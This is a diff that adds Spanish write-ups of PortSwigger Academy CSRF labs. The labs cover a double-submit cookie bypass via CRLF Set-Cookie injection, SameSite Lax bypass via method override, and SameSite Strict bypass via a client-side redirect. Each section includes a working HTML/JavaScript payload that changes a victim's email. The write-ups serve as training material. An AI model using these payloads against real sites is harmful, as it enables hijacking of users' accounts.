@@ -435,3 +435,80 @@ El ataque se desarrolla en dos fases:
 
 <img src="https://0ab000ad03b528c2804e494300ab003f.web-security-academy.net/?search=prueba%0d%0aSet-Cookie:csrfKey=icFb4T1G90YQOOcY9djppswJCSCqjNGs%3b%20SameSite=None" onerror="document.forms[0].submit();">
 ```
+
+
+## Reto 6:CSRF donde el token se duplica en la cookie
+
+
+La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Intenta utilizar la técnica insegura de prevención de CSRF de "doble envío".
+
+Para resolver el laboratorio, utilice su servidor de exploits para alojar una página HTML que utilice un ataque CSRF para cambiar la dirección de correo electrónico del espectador.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter
+
+El servidor compara el valor del token enviado en el cuerpo del formulario con el valor de una cookie del mismo nombre, pero ambos pueden ser controlados por el atacante.
+
+Para llevar a cabo el ataque, aprovechamos que la funcionalidad de búsqueda del sitio refleja parámetros en la cabecera Set-Cookie. Esto nos permite inyectar una cookie csrf falsa en el navegador de la víctima usando un enlace manipulado.
+
+Después, simplemente construimos un formulario que envía el mismo valor falso en el cuerpo de la petición, y así engañamos al servidor haciéndole creer que la petición es legítima.
+
+```html
+
+<form class="login-form" name="change-email-form" action="https://0ac900f0044525fe83a71ac300f70043.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="pwned@pwned.com">
+    <input required="" type="hidden" name="csrf" value="test">
+</form>
+
+<img src="https://0ac900f0044525fe83a71ac300f70043.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None" onerror="document.forms[0].submit();">
+
+```
+
+## Reto 7: Omisión de SameSite Lax mediante anulación de método
+
+La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Para solucionar este problema, realice un ataque CSRF que cambie la dirección de correo electrónico de la víctima. Debe usar el servidor de exploits proporcionado para alojar el ataque.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter  
+
+A pesar de usar cookies con SameSite por defecto en modo Lax, sigue siendo atacable. La clave del ataque es que los navegadores como Chrome permiten enviar cookies ‘SameSite=Lax‘ en peticiones GET que implican una navegación a nivel superior.
+
+Como la funcionalidad de cambio de email solo acepta peticiones POST, utilizamos una técnica conocida como method override, que consiste en enviar un parámetro especial (_method=POST) en la query string para que el servidor trate una petición GET como si fuera POST.
+
+Esto nos permite construir un ataque que simplemente redirige al usuario víctima con ‘document.location‘ hacia una URL especialmente manipulada, logrando que su navegador envíe la cookie de sesión y realice el cambio de email sin ninguna interacción adicional.
+
+
+
+```html
+<script>
+    location="https://0a330011049a6ae2809203f400f90032.web-security-academy.net/my-account/change-email?email=c@prueba.com&_method=POST";
+</script>
+```
+
+## Reto 8: Omisión estricta de SameSite mediante redirección del lado del cliente
+
+La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Para solucionar este problema, realice un ataque CSRF que cambie la dirección de correo electrónico de la víctima. Debe usar el servidor de exploits proporcionado para alojar el ataque.
+
+Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales: wiener:peter
+
+Una funcionalidad vulnerable al CSRF que, a pesar de usar cookies con SameSite Strict, permite el ataque debido a una redirección cliente-side basada en parámetros manipulables.
+
+El flujo del ataque es el siguiente:
+
+El navegador de la víctima primero realiza una petición GET a una ruta aparentemente inocua.
+Esa ruta incluye un parámetro que se inyecta directamente en el path de redirección usando JavaScript cliente-side.
+Con esa redirección controlada, conseguimos que el navegador envíe una petición GET autenticada al endpoint de cambio de email, el cual no exige tokens y permite método GET.
+Esta técnica permite bypassear SameSite Strict, ya que la cookie de sesión se envía en la segunda petición, que es una navegación directa dentro del mismo dominio. Así conseguimos que el cambio de email se efectúe sin interacción directa del usuario.
+
+
+```html
+<script>
+    location="https://0a6c003803c295db80761719000000cb.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3femail=hacked@hacked.com%26submit=1";
+</script>
+```
+
+## Reto 9: Omisión estricta de SameSite a través de un dominio hermano
+
+El chat en vivo de este laboratorio es vulnerable al secuestro de WebSockets entre sitios (CSWSH). Para solucionar el problema, inicie sesión en la cuenta de la víctima.
+
+Para ello, utilice el servidor de exploits proporcionado para ejecutar un ataque CSWSH que exfiltre el historial de chat de la víctima al servidor predeterminado de Burp Collaborator. El historial de chat contiene las credenciales de inicio de sesión en texto plano.
+
+Si aún no lo ha hecho, le recomendamos completar nuestro tema sobre vulnerabilidades de WebSocket antes de intentar realizar este laboratorio. 
